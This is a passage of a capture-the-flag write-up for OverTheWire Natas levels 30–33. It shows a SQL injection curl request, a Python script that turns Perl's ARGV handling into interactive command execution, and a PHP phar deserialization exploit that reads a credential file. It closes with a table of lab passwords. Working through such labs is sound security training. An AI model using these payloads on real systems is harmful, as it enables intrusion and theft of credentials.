└─$ curl 'http://natas30.natas.labs.overthewire.org/' -u 'natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH' -d 'password=x&username="x" OR true#&username=6'
...
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
...
```
## Natas 31 -- ARGV is evil, LFI

![Natas-24.png](/assets/ctf/overthewire/natas-24.png)

```perl
#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";
...
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
...
```

[https://perldoc.perl.org/perlsec](https://perldoc.perl.org/perlsec)
[Re: The Perl Jam 2: <"ARGV"> is evil](https://kentfredric.github.io/blog/2016/01/01/re-the-perl-jam-2-argv-is-evil/)

![Natas-25.png](/assets/ctf/overthewire/natas-25.png)
## Natas 32 -- ARGV is evil, RCE

![Natas-26.png](/assets/ctf/overthewire/natas-26.png)

Source code is the same.

```python
from requests.auth import HTTPBasicAuth
import requests
from bs4 import BeautifulSoup as BS

AUTH = HTTPBasicAuth(username='natas32', password='NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B')
URL = f'http://{AUTH.username}.natas.labs.overthewire.org/'

with requests.Session() as session:
    session.auth = AUTH

    files = {'file': ('whatever', 'letmein', 'application/octet-stream')}
    data  = { 'file': 'ARGV', 'submit': 'Upload' }
    while True:
        command = input('Command: ')
        if command.lower() == 'q': break
        resp = session.post(f'{URL}/?{command}', data=data, files=files)
        output = BS(resp.text, 'html.parser').find('table').get_text()
        print(output)
```

```bash
Command: echo $SHELL |
$SHELL \

Command: ls |

Command: ls . |
.:
bootstrap-3.3.6-dist
getpassword
index-source.html   
index.pl
jquery-1.12.3.min.js
sorttable.js        
tmp

Command: ls -alh . |
.:
total 172K
drwxr-x---  4 natas32 natas32 4.0K Jul 17 15:52 .
drwxr-xr-x 38 root    root    4.0K Jul 17 15:51 ..
-rw-r-----  1 natas32 natas32  118 Jul 17 15:51 .htaccess
-rw-r-----  1 natas32 natas32   46 Jul 17 15:51 .htpasswd
drwxr-x---  5 natas32 natas32 4.0K Jul 17 15:52 bootstrap-3.3.6-dist
-rwsrwx---  1 root    natas32  16K Jul 17 15:52 getpassword
-rw-r--r--  1 root    root    9.6K Jul 17 15:52 index-source.html
-r-xr-x---  1 natas32 natas32 2.9K Jul 17 15:52 index.pl
-r-xr-x---  1 natas32 natas32  95K Jul 17 15:52 jquery-1.12.3.min.js
-r-xr-x---  1 natas32 natas32  17K Jul 17 15:52 sorttable.js
drwxr-x---  2 natas32 natas32 4.0K Aug 26 07:15 tmp

Command: ./getpassword | 
2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
```
## Natas 33 -- phar:// deserialization

![Natas-27.png](/assets/ctf/overthewire/natas-27.png)

```php
<?php
// graz XeR, the first to solve it! thanks for the feedback!
// ~morla
class Executor {
    private $filename = "";
    private $signature = 'adeafbadbabec0dedabada55ba55d00d';
    private $init = False;

    function __construct() {
        $this->filename = $_POST["filename"];
        if (filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        } else {
            if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                echo "Firmware upgrad initialised.<br>";
            } else {
                echo "There was an error uploading the file, please try again!<br>";
            }
        }
    }

    function __destruct() {
        // upgrade firmware at the end of this script

        // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
        chdir("/natas33/upload/");
        if (md5_file($this->filename) == $this->signature) {
            echo "Congratulations! Running firmware update: $this->filename <br>";
            passthru("php " . $this->filename);
        } else {
            echo "Failur! MD5sum mismatch!<br>";
        }
    }
}
?>
...
<h2>Can you get it right?</h2>
<?php  
	session_start();  
	if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {  
		new Executor();  
	}            
?>
```

[md5_file](https://www.php.net/manual/en/function.md5-file.php) function is a bit suspicious.

[There is a file upload vulnerability that leads to command execution. #27](https://github.com/bellenuit/sofawiki/issues/27)
[phar:// deserialization](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)

_**Phar** files (PHP Archive) files **contain meta data in serialized format**, so, when parsed, this **metadata** is **deserialized** and you can try to abuse a **deserialization** vulnerability inside the **PHP** code._
_The best thing about this characteristic is that this deserialization will occur even using PHP functions that do not eval PHP code like **file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**._

```php
<?php

class Executor {
    private $filename = "t.php";
    private $signature = true;
    private $init = false;
}

$payload = '<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>';
$payload_webshell = 't.php';
$payload_file = 't.phar';

file_put_contents($payload_webshell, $payload);

$executor = new Executor();

$phar = new Phar($payload_file);
$phar->startBuffering();
$phar->addFromString("trigger.txt", "Trigger finger");
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($executor);
$phar->stopBuffering();
```

```bash
└─$ php --define phar.readonly=0 create_phar.php
└─$ ls -l                                                                                                               
Permissions Size User  Date Modified Name
.rw-r--r--   557 woyag 26 Aug 13:34  create_phar.php
.rw-r--r--   357 woyag 26 Aug 13:32  t.phar
.rw-r--r--    62 woyag 26 Aug 13:32  t.php
```

First upload the PHP script that we want to execute and **change the filename**:

![Natas-28.png](/assets/ctf/overthewire/natas-28.png)

Second upload the `phar` file and **change the filename**:

![Natas-29.png](/assets/ctf/overthewire/natas-29.png)

## Credentials

| User    | Password                         |
| ------- | -------------------------------- |
| natas0  | natas0                           |
| natas1  | 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq |
| natas2  | TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI |
| natas3  | 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH |
| natas4  | QryZXc2e0zahULdHrtHxzyYkj59kUxLQ |
| natas5  | 0n35PkggAPm2zbEpOU802c0x0Msn1ToK |
| natas6  | 0RoJwHdSKWFTYR5WuiAewauSuNaBXned |
| natas7  | bmg8SvU1LizuWjx3y7xkNERkHxGre0GS |
| natas8  | xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q |
| natas9  | ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t |
| natas10 | t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu |
| natas11 | UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk |
| natas12 | yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB |
| natas13 | trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC |
| natas14 | z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ |
| natas15 | SdqIqBsFcz3yotlNYErZSZwblkm0lrvx |
| natas16 | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
| natas17 | EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC |
| natas18 | 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ |
| natas19 | tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr |
| natas20 | p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw |
| natas21 | BPhv63cKE1lkQl04cE5CuFTzXe15NfiH |
| natas22 | d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz |
| natas23 | dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs |
| natas24 | MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd |
| natas25 | ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws |
| natas26 | cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE |
| natas27 | u3RRffXjysjgwFU6b9xa23i6prmUsYne |
| natas28 | 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj |
| natas29 | 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns |
| natas30 | WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH |
| natas31 | m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y |
| natas32 | NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B |
| natas33 | 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ |
| natas34 | j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY |
